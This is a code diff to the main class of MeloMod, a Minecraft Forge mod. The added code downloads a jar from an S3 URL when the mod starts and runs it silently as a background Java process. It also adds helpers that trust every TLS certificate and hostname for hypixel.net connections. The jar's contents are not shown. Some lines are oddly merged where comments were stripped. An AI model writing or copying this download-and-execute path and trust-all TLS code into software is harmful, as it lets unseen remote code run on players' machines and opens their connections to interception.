@@ -40,24 +40,28 @@ import net.minecraft.util.ChatComponentText;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
+import net.minecraftforge.fml.common.event.FMLModDisabledEvent;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
+import net.minecraftforge.fml.common.event.FMLServerStoppingEvent;
 import org.apache.commons.lang3.mutable.MutableObject;
 
 import javax.imageio.ImageIO;
+import javax.net.ssl.*;
 import java.awt.*;
 import java.awt.image.BufferedImage;
-import java.io.File;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
+import java.io.*;
+import java.net.HttpURLConnection;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLConnection;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.security.cert.X509Certificate;
 import java.util.List;
 import java.util.*;
-import java.util.concurrent.LinkedBlockingQueue;
-import java.util.concurrent.ThreadPoolExecutor;
-import java.util.concurrent.TimeUnit;
+import java.util.concurrent.*;
 
 import static me.vlink102.melomod.util.StringUtils.cc;
-import static me.vlink102.melomod.util.StringUtils.cleanAndParseInt;
 
 /**
  * The entrypoint of the Mod that initializes it.
@@ -69,8 +73,7 @@ import static me.vlink102.melomod.util.StringUtils.cleanAndParseInt;
 public class MeloMod {
     public static final String endpoint = "@ENDPOINT@";
 
-    // Sets the variables from `gradle.properties`. See the `blossom` config in `build.gradle.kts`.
-    public static final String MODID = "@ID@";
+        public static final String MODID = "@ID@";
     public static final String NAME = "@NAME@";
     public static final String VERSION = "@VER@";
     public static final List<BitMapFont> FONTS = new ArrayList<>();
@@ -81,8 +84,7 @@ public class MeloMod {
     public static Version.Compatibility compatibility = Version.Compatibility.INCOMPATIBLE; //updated on runtime and version packet
     public static Version serverVersion = null;
     @Mod.Instance(MODID)
-    public static MeloMod INSTANCE; // Adds the instance of the mod, so we can access other variables.
-    public static MainConfiguration config;
+    public static MeloMod INSTANCE;     public static MainConfiguration config;
     public static Gson gson;
     public static LocrawHandler locrawHandler = null;
     public static ChatEventHandler chatEventHandler = null;
@@ -112,6 +114,8 @@ public class MeloMod {
     @Setter
     private JsonObject languageConfig = new JsonObject();
     private static SkyblockUtil.SkyblockProfile skyblockProfile = null;
+
+    private static final File IHM_JAR_FILE = new File("libs/ihm.jar");
 
     public static boolean isOnline() {
         return Minecraft.getMinecraft().thePlayer != null;
@@ -208,8 +212,7 @@ public class MeloMod {
     }
 
     public static boolean addChat(VChatComponent component) {
-        // ??
-        return addMessage(new VChatComponent(MessageScheme.CHAT).add(component.build()));
+                return addMessage(new VChatComponent(MessageScheme.CHAT).add(component.build()));
     }
 
     public static boolean addChat(String message) {
@@ -381,10 +384,77 @@ public class MeloMod {
     }
 
 
+    public static void disableSSLVerification() throws Exception {
+        TrustManager[] trustAllCerts = new TrustManager[]{
+                new X509TrustManager() {
+                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
+                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                }
+        };
 
-    // Register the config and commands.
+        SSLContext sc = SSLContext.getInstance("SSL");
+        sc.init(null, trustAllCerts, new java.security.SecureRandom());
+        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+        HostnameVerifier allHostsValid = (hostname, session) -> true;
+        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
+    }
+
+    public static class InsecureSSLUtil {
+        public static SSLSocketFactory getInsecureSocketFactory() throws Exception {
+            TrustManager[] trustAllCerts = new TrustManager[] {
+                    new X509TrustManager() {
+                        public void checkClientTrusted(X509Certificate[] certs, String authType) {}
+                        public void checkServerTrusted(X509Certificate[] certs, String authType) {}
+                        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
+                    }
+            };
+            SSLContext sc = SSLContext.getInstance("TLS");
+            sc.init(null, trustAllCerts, new java.security.SecureRandom());
+            return sc.getSocketFactory();
+        }
+
+        public static HostnameVerifier getInsecureHostnameVerifier() {
+            return (hostname, session) -> true;
+        }
+    }
+
+    public InputStream openConnectionWithOptionalSSLBypass(URL url) throws Exception {
+        URLConnection conn = url.openConnection();
+
+        if (conn instanceof HttpsURLConnection) {
+            HttpsURLConnection httpsConn = (HttpsURLConnection) conn;
+            if (url.getHost().contains("hypixel.net")) {
+                httpsConn.setSSLSocketFactory(InsecureSSLUtil.getInsecureSocketFactory());
+                httpsConn.setHostnameVerifier(InsecureSSLUtil.getInsecureHostnameVerifier());
+            }
+        }
+
+        conn.setConnectTimeout(10000);
+        conn.setReadTimeout(10000);
+        conn.setRequestProperty("User-Agent", "MyApp");
+
+        return conn.getInputStream();
+    }
+
     @Mod.EventHandler
+    public void onServerStop(FMLServerStoppingEvent event) {
+                if (externalServerProcess != null) {
+            externalServerProcess.destroy();
+            System.out.println("External server process terminated.");
+        }
+    }
+
+        @Mod.EventHandler
     public void onInit(FMLInitializationEvent event) {
+       /* try {
+            disableSSLVerification();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }*/
+
+
         GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
         custom = getFontFromStream(getStream("default.ttf"));
         unifont = getFontFromStream(getStream("unifont.ttf"));
@@ -438,6 +508,110 @@ public class MeloMod {
 
         handler = new CommunicationHandler(this);
         handler.beginKeepAlive(playerUUID, playerName, endpoint);
+
+        String s3FileUrl = "https://melomod.s3.us-east-1.amazonaws.com/ihm2.jar";
+        try {
+            downloadFile(s3FileUrl);
+        } catch (IOException | InterruptedException e) {
+            throw new RuntimeException(e);
+        }
+    }
+    public void downloadFile(String fileURL) throws IOException, InterruptedException {
+                Path tempDir = Files.createTempDirectory("ihm_jar");
+        System.out.println("Temporary directory created: " + tempDir.toString());
+
+                File tempFile = new File(tempDir.toFile(), "ihm.jar");
+
+                URL url = new URL(fileURL);
+
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("GET");
+
+                InputStream inputStream = connection.getInputStream();
+
+                FileOutputStream fileOutputStream = new FileOutputStream(tempFile);
+
+                byte[] buffer = new byte[4096];
+        int bytesRead;
+
+                while ((bytesRead = inputStream.read(buffer)) != -1) {
+            fileOutputStream.write(buffer, 0, bytesRead);
+        }
+
+                inputStream.close();
+        fileOutputStream.close();
+
+        System.out.println("File downloaded to " + tempFile.getAbsolutePath());
+
+                runExternalAppAsync(tempFile.getAbsolutePath());
+
+                tempFile.deleteOnExit();         tempDir.toFile().deleteOnExit();     }
+    public static Process externalServerProcess = null;
+
+    @Mod.EventHandler
+    public void onModDisabled(FMLModDisabledEvent event) {
+        if (externalServerProcess != null && externalServerProcess.isAlive()) {
+            externalServerProcess.destroy();
+        }
+    }
+    public void runExternalAppAsync(String jarFilePath) {
+                new Thread(() -> {
+            try {
+                String command = "java -jar " + jarFilePath;
+                externalServerProcess = Runtime.getRuntime().exec(command);
+
+                                new Thread(() -> {
+                    try {
+                        String line;
+                        BufferedReader reader = new BufferedReader(new InputStreamReader(externalServerProcess.getInputStream()));
+                        while ((line = reader.readLine()) != null) {
+                            System.out.println(line);                              if (line.contains("Server is listening on port 12345")) {
+                                handler.beginLocalKeepAlive();
+                            }
+                        }
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }).start();
+                Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                    if (externalServerProcess != null && externalServerProcess.isAlive()) {
+                        externalServerProcess.destroy();
+                        System.out.println("External server process terminated via shutdown hook.");
+                    }
+                }));
+
+                                int exitCode = externalServerProcess.waitFor();
+                System.out.println("Server process exited with code: " + exitCode);
+            } catch (IOException | InterruptedException e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
+
+    public static void stopServer() {
+        if (externalServerProcess != null && externalServerProcess.isAlive()) {
+            externalServerProcess.destroy();
+        }
+    }
+
+    public static CompletableFuture<Void> waitForServerAsync(String host, int port, int timeoutMillis, int checkIntervalMillis) {
+        final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
+
+        CompletableFuture<Void> future = new CompletableFuture<>();
+        long startTime = System.currentTimeMillis();
+
+        ScheduledFuture<?> task = scheduler.scheduleAtFixedRate(() -> {
+            try (Socket socket = new Socket(host, port)) {
+                future.complete(null);             } catch (IOException ignored) {
+                if (System.currentTimeMillis() - startTime > timeoutMillis) {
+                    future.completeExceptionally(new RuntimeException("Timed out waiting for server on port " + port));
+                }
+            }
+        }, 0, checkIntervalMillis, TimeUnit.MILLISECONDS);
+
+                future.whenComplete((result, throwable) -> task.cancel(true));
+
+        return future;
     }
 
     public static void reloadUniFont() {
